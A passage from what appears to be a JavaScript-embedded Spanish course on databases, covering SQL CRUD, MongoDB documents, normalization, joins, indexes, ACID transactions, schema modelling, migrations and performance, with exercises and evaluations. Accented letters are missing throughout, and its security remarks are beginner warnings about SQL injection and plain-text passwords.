`,completed:!1},{id:"db-junior-sentencias-basicas",title:"Operaciones CRUD (SELECT, INSERT, UPDATE, DELETE)",level:"junior",content:`# Leccin 7: Operaciones CRUD (SELECT, INSERT, UPDATE, DELETE)

El ciclo de vida de cualquier dato se resume en 4 acciones: **Crear, Leer, Actualizar y Borrar**.

## 1. SELECT (Leer)
Ya lo vimos. Se usa para consultar.
\`\`\`sql
SELECT titulo FROM peliculas ORDER BY anio DESC;
\`\`\`

## 2. INSERT (Crear)
Se usa para agregar nuevas filas a la tabla.
\`\`\`sql
INSERT INTO productos (nombre, precio) VALUES ('Teclado Gamer', 15000);
\`\`\`

## 3. UPDATE (Actualizar)
 **CUIDADO!** Si olvidas el \`WHERE\`, actualizars a TODOS los registros de la tabla.
\`\`\`sql
-- Cambia el precio solo del producto con id 1
UPDATE productos SET precio = 18000 WHERE id = 1;

--  Error fatal: Cambia el precio de todos los productos de la tienda a 0
UPDATE productos SET precio = 0; 
\`\`\`

## 4. DELETE (Borrar)
 **DOBLE CUIDADO!** Al igual que UPDATE, un DELETE sin \`WHERE\` vaca tu tabla por completo.
\`\`\`sql
DELETE FROM productos WHERE stock = 0;
\`\`\`

---

## Mini Ejercicio
Ests creando una red social. Un usuario decide cambiar su nombre de "Juan" a "Juan El Mejor". Qu comando usaras para este cambio? (SELECT, INSERT, UPDATE o DELETE).
`,completed:!1},{id:"db-junior-intro-nosql",title:"Introduccin a NoSQL (Flexibilidad al Poder)",level:"junior",content:`# Leccin 8: Introduccin a NoSQL (Flexibilidad al Poder)

Si vienes de JavaScript, las bases de datos NoSQL basadas en documentos (como **MongoDB**) te resultarn muy naturales porque se parecen mucho a los objetos JSON.

## 1. Adis a las Tablas rgidas
En NoSQL no hablamos de tablas, sino de **Colecciones**. Y no hablamos de filas, sino de **Documentos**.

## 2. El Documento
Un documento es prcticamente un objeto JSON.
\`\`\`json
{
  "_id": "507f1f77bcf86cd799439011",
  "nombre": "Sofia",
  "gustos": ["coding", "pizza", "netflix"],
  "direccion": {
    "ciudad": "Madrid",
    "calle": "Gran Via"
  }
}
\`\`\`

## 3. Por qu es genial para JS?
*   No necesitas convertir los datos: Tu frontend enva un JSON, tu backend recibe un objeto y tu base de datos guarda ese mismo objeto.
*   Puedes guardar arrays (\`gustos\`) u otros objetos (\`direccion\`) dentro del mismo registro sin necesidad de crear otras tablas y conexiones complejas.

## 4. NoSQL no es solo Documentos
Existen otros tipos:
*   **Clave-Valor:** Como un objeto gigante \`{ token: 'abc123' }\`. Muy rpido (ej: Redis).
*   **Grafos:** Para conexiones complejas (ej: Amigos de Facebook).

---

## Mini Ejercicio
Si tuvieras que guardar la informacin de un Carrito de Compras que tiene una lista de productos que cambia todo el tiempo, crees que sera ms fcil hacerlo en una tabla SQL o en un documento NoSQL? 
`,completed:!1},{id:"db-junior-documentos-colecciones",title:"Documentos y Colecciones (El ABC de MongoDB)",level:"junior",content:`# Leccin 9: Documentos y Colecciones (El ABC de MongoDB)

Si SQL era para personas que aman el orden y la estructura, NoSQL (especficamente las de documentos) es para personas que aman la velocidad y la flexibilidad.

## 1. La Coleccin
Es el grupo de datos. Equivale a la "Tabla". Por ejemplo, la coleccin \`Usuarios\`.

## 2. El Documento (Record)
Es el objeto individual. Equivale a la "Fila".

## 3. Esquema Flexible (Vaya con Dios)
A diferencia de SQL, aqu cada documento puede ser diferente.
\`\`\`json
// Documento 1
{ "nombre": "Marta", "twitter": "@marta_ok" }

// Documento 2 (En la misma coleccin)
{ "nombre": "Pedro", "telefono": 1234567, "es_admin": true }
\`\`\`
Esto en SQL es imposible sin alterar la tabla completa!

## 4. Cundo se vuelve esto un problema?
La flexibilidad es un arma de doble filo. Si no tienes cuidado, tu base de datos puede terminar llena de datos incoherentes (un usuario con el campo \`email\` y otro con el campo \`correo_electronico\`). Por eso, aunque la DB lo permita, solemos usar libreras como **Mongoose** en Node.js para forzar un poco de orden.

---

## Mini Ejercicio
Imagina una coleccin de \`Comentarios\`. Escribe en formato JSON cmo se vera un documento de un comentario que tenga: \`usuario\`, \`fecha\` y un array de \`likes\`.
`,completed:!1},{id:"db-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 10: Buenas Prcticas Bsicas

No importa si usas SQL o NoSQL, hay reglas de oro que todo desarrollador debe seguir para no odiar su vida en el futuro.

## 1. El ID es SAGRADO
Nunca uses un campo que pueda cambiar (como el \`email\` o el \`nombre\`) como clave primaria. Usa siempre un ID autogenerado nico.

## 2. Nombres Claros
Llama a tus tablas en plural (ej: \`usuarios\`) o singular (ej: \`usuario\`), pero **elige una forma y mantenla** en todo el proyecto. Lo mismo para los campos: usa \`snake_case\` o \`camelCase\`, pero no mezcles ambos.

## 3. Seguridad Ante Todo (SQL Injection)
Nunca metas directamente lo que el usuario escribe en tu sentencia SQL.
*   **Mal:** \`SELECT * FROM usuarios WHERE pass = '\` + input_del_usuario + \`'\`
*   **Bien:** Usa "Consultas Preparadas" o libreras (ORM) que limpien los datos por ti.

## 4. Backups (Copias de Seguridad)
Existen dos tipos de desarrolladores: los que hacen backups y los que todava no han perdido todos sus datos. Siempre automatiza una copia de tu base de datos.

## 5. No guardes contraseas en texto plano
**NUNCA** guardes \`contrasena: "123456"\`. Debes guardarlas encriptadas (usando Hashes) para que, si hackean tu base de datos, los atacantes no puedan leerlas.

---

## Desafo Junior
Has terminado el mdulo bsico. Ahora, intenta explicarle a alguien con tus propias palabras qu es una **Relacin Uno a Muchos** y pon un ejemplo de la vida real (que no sea el de Autores y Libros).

Felicidades! Tienes los cimientos para empezar a trabajar con el Backend 
`,completed:!1},{id:"db-junior-ejercicios",title:"Ejercicios Prcticos: Bases de Datos Junior",level:"junior",content:`# Ejercicios Prcticos: Bases de Datos Junior

Aplica los conceptos de SQL y NoSQL en escenarios del mundo real. Estos ejercicios te ayudarn a pensar como un desarrollador de backend.

---

## 1. Modelado de Tabla: La Biblioteca
**Objetivo:** Practicar la definicin de campos y tipos de datos.

**Consigna:**
Imagina que debes disear la tabla para una biblioteca. Define qu columnas tendra una tabla llamada \`libros\`.
*   Debes incluir al menos 6 campos (ej: id, ttulo, etc).
*   Para cada campo, indica qu **tipo de dato** usaras (Texto, Nmero, Fecha, Booleano).
*   Identifica cul campo sera la **Primary Key**.

**Resultado esperado:** Una lista clara de campos con sus tipos y restricciones bsicas.

---

## 2. CRUD SQL: El Videoclub
**Objetivo:** Escribir sentencias SQL bsicas.

**Consigna:**
Tienes una tabla llamada \`peliculas\` con los campos: \`id\`, \`titulo\`, \`genero\`, \`puntuacion\`.
Escribe el cdigo SQL para realizar las siguientes tareas:
1.  **Crear:** Inserta una nueva pelcula de terror llamada "El Faro" con una puntuacin de 9.
2.  **Leer:** Obtn solo los ttulos de las pelculas que tengan una puntuacin mayor a 8.
3.  **Actualizar:** Sube la puntuacin a 10 de la pelcula con \`id = 3\`.
4.  **Borrar:** Elimina todas las pelculas que sean del gnero 'Comedia'.

**Resultado esperado:** 4 bloques de cdigo SQL (\`INSERT\`, \`SELECT\`, \`UPDATE\`, \`DELETE\`).

---

## 3. Base de Datos para Usuarios: Perfiles Sociales
**Objetivo:** Entender la integridad de los datos y campos obligatorios.

**Consigna:**
Disea una tabla de \`usuarios\` para una red social.
*   Qu campos deberan ser nicos (\`UNIQUE\`)?
*   Qu campos no podran estar vacos (\`NOT NULL\`)?
*   Cmo guardaras la fecha de nacimiento para poder calcular la edad?
*   **Extra:** Qu tipo de dato usaras para guardar si la cuenta est verificada o no?

**Resultado esperado:** Un esquema de tabla detallando las reglas de cada columna.

---

## 4. Mini-Inventario NoSQL: Tienda de Electrnica
**Objetivo:** Practicar la estructura de documentos JSON.

**Consigna:**
Disea un **Documento NoSQL** (formato JSON) para un producto tecnolgico complejo (por ejemplo, un Smartphone).
*   Aprovecha la flexibilidad de NoSQL: incluye un array para las \`caracteristicas\` (ej: 5G, Bluetooth).
*   Incluye un objeto anidado para las \`especificaciones_tecnicas\` (ej: ram, procesador).
*   Simula cmo guardaras las valoraciones de los clientes (un array de objetos con \`usuario\` y \`puntos\`).

**Resultado esperado:** Un objeto JSON bien formado y anidado.

---

## 5. El Dilema del Arquitecto: Registro de Logins
**Objetivo:** Comparar SQL vs NoSQL segn el caso de uso.

**Consigna:**
Tu aplicacin necesita guardar un registro de cada vez que alguien inicia sesin (fecha, hora, IP, dispositivo).
*   Si planeas tener millones de estos registros al da y no necesitas relacionarlos con nada ms, qu tipo de base de datos usaras y por qu?
*   Si necesitas generar reportes mensuales exactos de seguridad y unir esos datos con la tabla de \`perfiles_de_seguridad\`, cambiara tu eleccin?

**Resultado esperado:** Una breve justificacin tcnica comparando ambas opciones para este caso especfico.

---

Manos a la obra! Dominar los datos es dominar el flujo de la aplicacin. 
`,completed:!1,isProject:!0},{id:"db-junior-evaluacion",title:"Evaluacin Bases de Datos Junior",level:"junior",content:`# Evaluacin Final: Bases de Datos Junior

Demuestra tu comprensin sobre cmo se almacena la informacin y las diferencias entre SQL y NoSQL.

## 1. Examen Terico
*   Qu es una Clave Primaria y por qu es obligatoria en cada tabla?
*   Menciona una ventaja de SQL sobre NoSQL y viceversa.
*   Qu riesgo corremos si ejecutamos un \`DELETE\` sin la clusula \`WHERE\`?

## 2. Desafo Prctico SQL: La Veterinaria
Imagina una tabla llamada \`mascotas\` con las columnas: \`id\`, \`nombre\`, \`especie\`, \`edad\`.
Escribe las sentencias SQL para:
1. Obtener los nombres de todas las mascotas que sean 'Perro'.
2. Insertar una nueva mascota: 'Luna', 'Gato', 2 aos.
3. Actualizar la edad de la mascota con id 5 a 3 aos.
4. Borrar a todas las mascotas mayores de 15 aos.

## 3. Desafo Prctico NoSQL: Catlogo de Juegos
Escribe en formato JSON cmo guardaras la informacin de un videojuego en una base de datos de documentos (NoSQL). Debe incluir:
*   Ttulo.
*   Gneros (un array).
*   Desarrollador (un objeto con nombre y pas).
*   Ao de lanzamiento.

## 4. Criterios de Aprobacin
* [ ] Distincin clara entre tablas/filas y colecciones/documentos.
* [ ] Sintaxis SQL bsica correcta.
* [ ] Estructura JSON vlida.
* [ ] Comprensin de las reglas de seguridad bsicas (hashes, SQL injection).
`,completed:!1,isProject:!0},{id:"db-semi-senior-normalizacion",title:"Normalizacin: Organizando el Caos",level:"semi-senior",content:'# Leccin 11: Normalizacin: Organizando el Caos\n\nLa normalizacin es el proceso de organizar los datos para reducir la redundancia y mejorar la integridad. A nivel Semi-Senior, ya no solo creas tablas; las diseas para que no se vuelvan un infierno de mantenimiento.\n\n## 1. El Problema de la Redundancia\nSi guardas el nombre y la direccin del cliente en cada fila de la tabla `Pedidos`, y el cliente cambia de direccin, tienes que actualizar 1,000 filas. Si olvidas una, tienes datos inconsistentes.\n\n## 2. Las Formas Normales (1NF, 2NF, 3NF)\n\n### Primera Forma Normal (1NF): Atomicidad\n*   Cada celda debe tener un solo valor.\n*   No puedes tener una columna `telefonos` con "123, 456, 789". Debes crear filas separadas o una tabla de telfonos.\n\n### Segunda Forma Normal (2NF): Dependencia Total\n*   Se aplica a tablas con claves compuestas. Todo campo que no sea clave debe depender de **toda** la clave primaria, no solo de una parte.\n\n### Tercera Forma Normal (3NF): Dependencia Transitiva\n*   Un campo no debe depender de otro campo que no sea la clave primaria.\n*   **Ejemplo Incorrecto:** Tabla `Libros` con `autor_id` y `autor_fecha_nacimiento`. El campo `autor_fecha_nacimiento` depende de `autor_id`, no del libro directamente. Mueve eso a una tabla `Autores`!\n\n## 3. Cundo NO normalizar? (Desnormalizacin)\nA veces, en sistemas de mucha lectura (como un catlogo de productos gigante), normalizar demasiado hace que las consultas sean lentas por tener demasiados JOINS. Un Semi-Senior sabe cundo romper las reglas por performance.\n\n---\n\n## Mini Ejercicio\nTienes una tabla `Factura` con los campos: `id`, `cliente_id`, `cliente_nombre`, `producto`, `precio`. Qu forma normal est rompiendo y cmo la separaras en dos tablas?\n',completed:!1},{id:"db-semi-senior-relaciones-avanzadas",title:"Relaciones y Asociaciones Avanzadas",level:"semi-senior",content:`# Leccin 12: Relaciones y Asociaciones Avanzadas

Entender cmo se conectan los datos es la base de un buen modelado.

## 1. El comodn: Muchos a Muchos (N:N)
SQL no permite de forma nativa una relacin N:N directa. Necesitamos una **Tabla Intermedia** (o Tabla de Unin).

### Ejemplo: Estudiantes y Cursos
*   Un estudiante se anota en muchos cursos.
*   Un curso tiene muchos estudiantes.

**Solucin:** Tabla \`inscripciones\`:
*   \`estudiante_id\` (FK)
*   \`curso_id\` (FK)
*   \`fecha_inscripcion\` (Aqu puedes guardar datos extras de la relacin).

## 2. Relaciones Recursivas
Ocurre cuando una tabla se relaciona consigo misma.
*   **Ejemplo:** Una tabla \`empleados\` donde la columna \`jefe_id\` apunta al \`id\` de otro empleado en la misma tabla.

## 3. Acciones en Cascada (\`ON DELETE\`)
Qu pasa con los Pedidos si borras al Cliente?
*   **CASCADE:** Se borran todos sus pedidos automticamente ( Peligroso).
*   **SET NULL:** Los pedidos se quedan sin dueo, pero no se borran.
*   **RESTRICT:** No te deja borrar al cliente mientras tenga pedidos asociados.

---

## Mini Ejercicio
Disea las tablas necesarias para un sistema de "Seguidores" de Twitter. Una persona puede seguir a muchas, y ser seguida por muchas. Cmo se llamara la tabla intermedia y qu campos tendra?
`,completed:!1},{id:"db-semi-senior-indices",title:"ndices: El Secreto de la Velocidad",level:"semi-senior",content:"# Leccin 13: ndices: El Secreto de la Velocidad\n\nUn ndice en una base de datos es como el ndice al final de un libro. No necesitas leer todo el libro para encontrar un tema; vas al ndice y saltas a la pgina exacta.\n\n## 1. El Costo de la Bsqueda\nSin ndice: La DB hace un **Full Table Scan** (lee fila por fila de 1 milln de registros).\nCon ndice: La DB encuentra el dato en milisegundos.\n\n## 2. Tipos de ndices\n*   **B-Tree (Por defecto):** Ideal para bsquedas de igualdad (`=`) y rangos (`>`, `<`).\n*   **Hash:** Muy rpido para comparaciones de igualdad exacta, pero no sirve para rangos.\n*   **Full-Text:** Especializado en buscar palabras dentro de textos largos.\n\n## 3. El Tradeoff (La Trampa)\nLos ndices no son gratis.\n*    Aceleran las lecturas (`SELECT`).\n*    Ralentizan las escrituras (`INSERT`, `UPDATE`, `DELETE`) porque la base de datos tiene que actualizar el ndice cada vez que cambias un dato.\n\n## 4. Cundo indexar?\nIndexa columnas que uses frecuentemente en tus clusulas `WHERE`, `JOIN` u `ORDER BY`. No indexes columnas que cambian constantemente o que tienen muy poca variedad de datos (ej: una columna `genero` con solo dos valores).\n\n---\n\n## Mini Ejercicio\nEn una tabla de 10 millones de `Usuarios`, sueles buscar siempre por `email` y a veces por `nombre`. A qu columnas le pondras un ndice?\n",completed:!1},{id:"db-semi-senior-consultas-complejas",title:"Consultas Complejas y Agregaciones",level:"semi-senior",content:`# Leccin 14: Consultas Complejas y Agregaciones

A medida que creces, ya no solo pides datos; haces preguntas de negocio a la base de datos.

## 1. Funciones de Agregacin
Calculan un valor a partir de un conjunto de filas:
*   \`COUNT()\`: Contar.
*   \`SUM()\`: Sumar valores.
*   \`AVG()\`: Promedio.
*   \`MAX()\` / \`MIN()\`: Valores extremos.

## 2. El Poder de \`GROUP BY\`
Permite agrupar filas que comparten el mismo valor en una columna.
\`\`\`sql
-- Cuntos pedidos ha hecho cada cliente?
SELECT cliente_id, COUNT(*) as total_pedidos 
FROM pedidos 
GROUP BY cliente_id;
\`\`\`

## 3. Filtrando Grupos con \`HAVING\`
A diferencia de \`WHERE\` (que filtra filas antes de agrupar), \`HAVING\` filtra despus de agrupar.
\`\`\`sql
-- Dame solo los clientes que han hecho ms de 5 pedidos
SELECT cliente_id, COUNT(*) as total 
FROM pedidos 
GROUP BY cliente_id 
HAVING COUNT(*) > 5;
\`\`\`

## 4. Subconsultas (Subqueries)
Una consulta dentro de otra.
\`\`\`sql
SELECT nombre FROM usuarios 
WHERE id IN (SELECT usuario_id FROM facturas WHERE monto > 1000);
\`\`\`

---

## Mini Ejercicio
Escribe el cdigo para obtener el precio promedio de todos los productos de la categora 'Electrnica'.
`,completed:!1},{id:"db-semi-senior-joins",title:"JOINS: Uniendo Mundos",level:"semi-senior",content:`# Leccin 15: JOINS: Uniendo Mundos

Los Joins permiten combinar filas de dos o ms tablas basndose en una columna relacionada.

## 1. INNER JOIN (El ms comn)
Devuelve registros que tienen valores coincidentes en ambas tablas. Si un cliente no tiene pedidos, no aparecer en el resultado.
\`\`\`sql
SELECT clientes.nombre, pedidos.fecha
FROM clientes
INNER JOIN pedidos ON clientes.id = pedidos.cliente_id;
\`\`\`

## 2. LEFT (OUTER) JOIN
Trae **todos** los registros de la tabla izquierda y los que coincidan de la derecha. Si no hay coincidencia, devuelve \`NULL\` en los campos de la derecha.
*   **Caso Real:** Ver una lista de todos tus clientes, incluso los que nunca han comprado nada.

## 3. RIGHT (OUTER) JOIN
Lo opuesto al anterior. Trae todo lo de la derecha. (Se usa menos, normalmente puedes lograr lo mismo invirtiendo el orden de las tablas en un LEFT JOIN).

## 4. FULL OUTER JOIN
Trae todo cuando hay una coincidencia en una de las tablas.

## 5. El peligro de los Joins masivos
Unir 5 tablas gigantes puede destruir la performance de tu servidor. Siempre revisa si tus columnas de unin (ON) estn indexadas.

---

## Mini Ejercicio
Tienes una tabla \`Artistas\` y una tabla \`Albunes\`. Quieres una lista de todos los artistas, y para los que tengan lbumes, mostrar el ttulo del lbum. Qu tipo de JOIN usaras?
`,completed:!1},{id:"db-semi-senior-transacciones",title:"Transacciones y el Concepto ACID",level:"semi-senior",content:`# Leccin 16: Transacciones y el Concepto ACID

En aplicaciones crticas (como un banco), no puedes permitir que los datos queden "a medias".

## 1. El Escenario del Desastre
Juan le transfiere $100 a Ana.
1. Restar $100 a Juan.
2. (Se cae el internet o se apaga el servidor )
3. Sumar $100 a Ana.

Resultado: Juan perdi dinero y Ana nunca lo recibi. El dinero desapareci del sistema.

## 2. La Solucin: Transacciones
Una transaccin es un conjunto de instrucciones que se tratan como una **unidad nica**. O se hacen todas, o no se hace ninguna.

\`\`\`sql
START TRANSACTION;
  UPDATE cuentas SET saldo = saldo - 100 WHERE usuario = 'Juan';
  UPDATE cuentas SET saldo = saldo + 100 WHERE usuario = 'Ana';
COMMIT; -- Guarda los cambios si todo sali bien
-- O usa ROLLBACK; si algo fall para deshacer todo
\`\`\`

## 3. ACID
Es el conjunto de propiedades que garantizan la fiabilidad:
*   **Atomicidad (Atomicity):** Todo o nada.
*   **Consistencia (Consistency):** La DB pasa de un estado vlido a otro estado vlido.
*   **Aislamiento (Isolation):** Dos transacciones al mismo tiempo no se molestan entre s.
*   **Durabilidad (Durability):** Una vez guardado, el cambio es permanente (aunque se corte la luz despus).

---

## Mini Ejercicio
En qu otro caso, aparte de una transferencia bancaria, crees que es vital usar una Transaccin?
`,completed:!1},{id:"db-semi-senior-modelado-sql",title:"Modelado SQL (Esquemas y Planificacin)",level:"semi-senior",content:`# Leccin 17: Modelado SQL (Esquemas y Planificacin)

Modelar en SQL es como construir un edificio: necesitas planos antes de poner el primer ladrillo.

## 1. Diagrama Entidad-Relacin (DER/ERD)
Antes de tocar el cdigo, dibujamos.
*   **Rectngulos:** Entidades (Tablas).
*   **Lneas:** Relaciones.
*   **Rombos:** Tipo de accin (opcional).

## 2. Estrategias de Claves Primarias
*   **ID Incremental (Serial):** \`1, 2, 3...\` Fcil de leer, pero revela cuntos datos tienes (un competidor puede saber cuntos pedidos vendes al da).
*   **UUID:** \`550e8400-e29b...\` Es un identificador nico universal de 36 caracteres. Imposible de adivinar y excelente para sistemas distribuidos.

## 3. Tipos de Datos Correctos
*   No uses \`TEXT\` para todo. Si es una edad, usa \`SMALLINT\`. Si es un precio, usa \`DECIMAL\` o \`NUMERIC\` (nunca \`FLOAT\` para dinero por errores de redondeo).
*   Usar el tipo correcto ahorra espacio y hace las bsquedas ms rpidas.

## 4. Soft Delete vs Hard Delete
Un Semi-Senior rara vez borra datos de verdad (\`Hard Delete\`).
*   **Soft Delete:** Agregas una columna \`deleted_at\`. Cuando el usuario "borra" algo, solo guardas la fecha. Tus consultas siempre filtran \`WHERE deleted_at IS NULL\`. Esto permite recuperar datos por error humano o auditora.

---

## Mini Ejercicio
Disea el esquema bsico (nombres de tablas y columnas principales) para un sistema de **Blog**. Debe haber Usuarios, Posts y Comentarios.
`,completed:!1},{id:"db-semi-senior-modelado-nosql",title:"Modelado NoSQL (Patrones y Documentos)",level:"semi-senior",content:`# Leccin 18: Modelado NoSQL (Patrones y Documentos)

En NoSQL, modelamos basndonos en cmo vamos a **leer** los datos, no en cmo los guardamos.

## 1. Embeber (Embedding) vs Referenciar (Referencing)

### Embeber (Dentro del mismo documento)
Guardas los datos relacionados dentro del objeto padre.
*    **Pros:** Lectura ultra rpida (una sola consulta).
*    **Contras:** El documento tiene un lmite de tamao (ej: 16MB en MongoDB). Los datos se repiten.
*   **Cundo usar:** Cuando los datos siempre se muestran juntos (ej: Direccin de un Usuario).

### Referenciar (Como el ID de SQL)
Guardas el ID del otro documento.
*    **Pros:** Datos consistentes y no repetidos.
*    **Contras:** Necesitas dos consultas (o un \`lookup/populate\`) lo cual es ms lento.
*   **Cundo usar:** Para datos que crecen mucho (ej: Seguidores de una cuenta).

## 2. El Anti-patrn del Crecimiento Infinito
Nunca metas un array que pueda crecer sin control dentro de un documento.
\`\`\`json
//  MAL: Si el post tiene 100,000 comentarios, el documento explotar.
{
  "titulo": "Mi Post",
  "comentarios": [ { ... }, { ... } ] 
}
\`\`\`

## 3. Atomicidad en NoSQL
A diferencia de SQL, muchas DB NoSQL solo garantizan que una operacin a **un solo documento** es atmica. Si cambias 3 documentos a la vez y falla a la mitad, quedas inconsistente. Tenlo en cuenta al disear.

---

## Mini Ejercicio
Para una aplicacin de **Recetas de Cocina**, los ingredientes de una receta, los "embeberas" o los "referenciaras" a otra coleccin? Justifica tu respuesta.
`,completed:!1},{id:"db-semi-senior-migraciones",title:"Migraciones de Datos y Evolucin del Esquema",level:"semi-senior",content:`# Leccin 19: Migraciones de Datos y Evolucin del Esquema

Las aplicaciones vivas cambian. Hoy tu usuario no tiene "telfono", maana es obligatorio. Cmo cambias la base de datos sin romper el sistema?

## 1. El concepto de Migracin
Una migracin es un archivo de cdigo que describe un cambio en la DB (Aadir columna, Crear tabla).
*   Se guardan en orden cronolgico (\`20230101_create_users.js\`, \`20230105_add_phone_to_users.js\`).
*   Permiten que todo el equipo tenga exactamente la misma estructura de DB.

## 2. Up y Down
Cada migracin suele tener dos funciones:
*   **UP:** El cambio que quieres hacer.
*   **DOWN:** Cmo deshacer ese cambio si algo sale mal (Rollback).

## 3. Migracin de Datos Activos
Cuando agregas un campo \`NOT NULL\` a una tabla que ya tiene 1 milln de filas, la DB fallar porque no sabe qu poner en el pasado.
*   **Paso 1:** Agregar columna permitiendo \`NULL\`.
*   **Paso 2:** Correr un script que llene los datos vacos con un valor por defecto.
*   **Paso 3:** Cambiar la columna a \`NOT NULL\`.

## 4. Herramientas Populares
*   **Sequelize / TypeORM / Prisma:** Para Node.js.
*   **Knex.js:** Para migraciones SQL puras.
*   **Flyway / Liquibase:** Herramientas de sistema.

---

## Mini Ejercicio
Por qu es peligroso borrar una columna de una base de datos en produccin directamente desde la consola sin usar un sistema de migraciones?
`,completed:!1},{id:"db-semi-senior-buenas-practicas-reales",title:"Buenas Prcticas Reales y Performance",level:"semi-senior",content:`# Leccin 20: Buenas Prcticas Reales y Performance

Un Semi-Senior no solo hace que funcione, hace que funcione bien bajo presin.

## 1. El problema del N+1
Es el error de performance ms comn.
*   **Junior:** Pido los 10 posts. Luego, por cada post, hago una nueva consulta a la DB para traer el nombre del autor. (Total: 11 consultas).
*   **Semi-Senior:** Uso un \`JOIN\` para traer los 10 posts con sus autores en una sola llamada. (Total: 1 consulta).

## 2. Paginacin: Nunca pidas "Todo"
Hacer un \`SELECT * FROM logs\` en una tabla con 50 millones de filas tumbar tu servidor.
Usa siempre \`LIMIT\` y \`OFFSET\` (o paginacin por cursores para mayor velocidad).

## 3. Vistas y Procedimientos Almacenados
*   **Views:** Son consultas guardadas que actan como tablas virtuales. tiles para ocultar complejidad.
*   **Stored Procedures:** Cdigo que se ejecuta dentro de la DB. Muy rpidos, pero difciles de testear y versionar en Git.

## 4. Pooling de Conexiones
Abrir una conexin a la DB es costoso. No abras una por cada usuario. Usa un **Connection Pool** que mantenga un grupo de conexiones abiertas y las "preste" a los usuarios segn necesiten.

## 5. Explicando la Consulta (\`EXPLAIN\`)
Antes de decir "la base de datos es lenta", usa el comando \`EXPLAIN ANALYZE\`. Te dir exactamente cuntas filas ley y por qu ndices pas.

---

## Proyecto Semi-Senior Final
Disea y escribe las sentencias SQL para un **E-commerce**:
1.  Normaliza hasta la 3ra forma normal (Productos, Categoras, Pedidos, Usuarios).
2.  Escribe una consulta con \`JOIN\` que muestre el total gastado por cada usuario en el ltimo mes.
3.  Agrega ndices a las columnas que consideres crticas.
4.  Escribe una transaccin para el proceso de compra (restar stock + crear pedido).

Excelente! Has pasado de "guardar datos" a convertirte en un profesional de la informacin. 
`,completed:!1,isProject:!0},{id:"db-semi-senior-ejercicios",title:"Ejercicios Prcticos: Semi-Senior",level:"semi-senior",content:`# Ejercicios Prcticos: Bases de Datos Semi-Senior

Estos ejercicios estn diseados para evaluar tu capacidad de modelado relacional, optimizacin de consultas y manejo de integridad de datos.

---

## 1. Desafo de Normalizacin: El Gimnasio
**Contexto:** Tienes un archivo de Excel con una sola pestaa donde se anota todo: \`NombreCliente\`, \`DNI\`, \`Direccion\`, \`NombrePlan\`, \`PrecioPlan\`, \`FechaPago\`, \`EntrenadorAsignado\`.

**Consigna:**
*   Aplica las **3 Formas Normales (1NF, 2NF, 3NF)**.
*   Dibuja el esquema final (tablas y columnas).
*   Justifica por qu separaste los datos de esa manera para evitar anomalas de actualizacin.

---

## 2. SQL Query Master: El E-commerce
**Contexto:** Tienes las tablas \`usuarios\`, \`pedidos\` y \`productos\`.

**Consigna:**
Escribe una sola consulta SQL que devuelva:
1.  Nombre del usuario.
2.  Total de dinero gastado por ese usuario.
3.  Cantidad de pedidos realizados.
*Solo para usuarios que hayan gastado ms de $50,000 acumulados, ordenados de mayor a menor gasto.*

---

## 3. Integridad y Relaciones: Sistema de Permisos
**Contexto:** Debes modelar un sistema donde un \`Usuario\` puede tener mltiples \`Roles\` (Admin, Editor, Viewer), y un \`Rol\` puede pertenecer a mltiples \`Usuarios\`.

**Consigna:**
*   Disea la tabla intermedia necesaria.
*   Escribe el SQL para obtener todos los usuarios que tengan el rol de 'Admin'.
*   Define qu restriccin \`ON DELETE\` usaras para que, si se borra un rol, no se rompa la base de datos.

---

## 4. Performance: El Buscador Lento
**Contexto:** La tabla \`articulos\` tiene 5 millones de registros. La consulta \`SELECT * FROM articulos WHERE titulo LIKE 'Curso%'\` tarda 5 segundos.

**Consigna:**
*   Qu tipo de ndice crearas para mejorar esto?
*   Funcionara un ndice B-Tree normal para un \`LIKE '%Curso%'\` (con el porcentaje al inicio)? Explica por qu.

---

## 5. Transacciones: Transferencia de Puntos
**Contexto:** Un sistema de fidelidad donde un usuario regala puntos a otro.

**Consigna:**
*   Escribe el bloque de cdigo (transaccin) para restar puntos al usuario A y sumarlos al usuario B.
*   Asegura que el usuario A no pueda quedar con puntos negativos (validacin de integridad).

---
`,completed:!1,isProject:!0},{id:"db-semi-senior-evaluacion",title:"Evaluacin Tcnica Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: Bases de Datos Semi-Senior

Esta evaluacin mide tu capacidad para disear, consultar y optimizar bases de datos en entornos profesionales de desarrollo.

## 1. Examen Terico (Conceptos Avanzados)
*   **JOINS:** Explica con un ejemplo real cundo es obligatorio usar un \`LEFT JOIN\` en lugar de un \`INNER JOIN\`.
*   **ACID:** Define qu es la **Atomicidad** y pon un ejemplo de qu pasara si una base de dato no la garantiza.
*   **ndices:** Por qu no es buena idea indexar todas las columnas de una tabla? Explica el impacto en las operaciones de escritura.
*   **Normalizacin:** En qu caso real consideraras **desnormalizar** una tabla (romper las formas normales) a propsito?

## 2. Desafo de Modelado: Sistema de Reservas
Disea las tablas para un sistema de reservas de un **Hotel**.
Debe soportar:
*   Clientes.
*   Habitaciones (con diferentes tipos: Suite, Simple, Doble).
*   Reservas (con fecha de entrada y salida).
*   **Restriccin:** No puede haber dos reservas para la misma habitacin en las mismas fechas. Cmo implementaras esta validacin?

## 3. SQL Prctico: Estadsticas de Blog
Dada una tabla \`posts(id, titulo, autor_id, fecha)\` y \`comentarios(id, post_id, texto)\`:
*   Escribe una consulta que obtenga el ttulo de los 5 posts con ms comentarios.
*   Escribe una consulta que liste a todos los autores que no han escrito ningn post en los ltimos 6 meses.

## 4. Criterios de Aprobacin
* [ ] Dominio de normalizacin hasta 3NF.
* [ ] Capacidad para escribir JOINS y funciones de agregacin (\`COUNT\`, \`SUM\`, \`GROUP BY\`).
* [ ] Entendimiento del concepto de consistencia y transacciones.
* [ ] Criterio tcnico para decidir cundo usar ndices.

---
`,completed:!1,isProject:!0},{id:"db-senior-diseno-modelos-complejos",title:"Diseo de Modelos Complejos",level:"senior",content:`# Leccin 21: Diseo de Modelos Complejos

Como Arquitecto, el diseo de la base de datos no se trata de "dnde pongo este campo", sino de cmo el flujo de datos soportar el crecimiento del negocio a 5 o 10 aos.

## 1. Patrones de Diseo de Esquemas Senior

### Polimorfismo en SQL
Cmo modelamos una tabla \`Comentarios\` que puede pertenecer a un \`Post\`, un \`Video\` o una \`Imagen\`?
*   **Exclusive Belongs To (Class Table Inheritance):** Una columna de FK por cada tipo (\`post_id\`, \`video_id\`), con un constraint que asegure que solo una sea no nula.
